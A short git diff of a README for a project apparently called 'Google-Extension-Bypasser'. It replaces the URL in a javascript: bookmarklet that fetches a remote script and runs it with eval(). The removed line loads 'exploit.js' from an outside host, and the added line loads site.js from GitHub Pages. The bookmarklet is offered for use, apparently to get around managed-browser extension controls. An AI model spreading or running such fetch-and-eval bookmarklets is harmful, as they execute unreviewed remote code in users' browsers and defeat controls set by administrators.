@@ -5,5 +5,5 @@ Source is active using GitHub's Pages:
 [site](https://livxy.github.io/Google-Extension-Bypasser/site.js)
 
 ```javascript
-javascript:fetch(`https://compactcow.com/ltbeef/exploit.js`).then(data=>{data.text().then(text=>{eval(text)})});
+javascript:fetch(`https://livxy.github.io/Google-Extension-Bypasser/site.js`).then(data=>{data.text().then(text=>{eval(text)})});
 ```
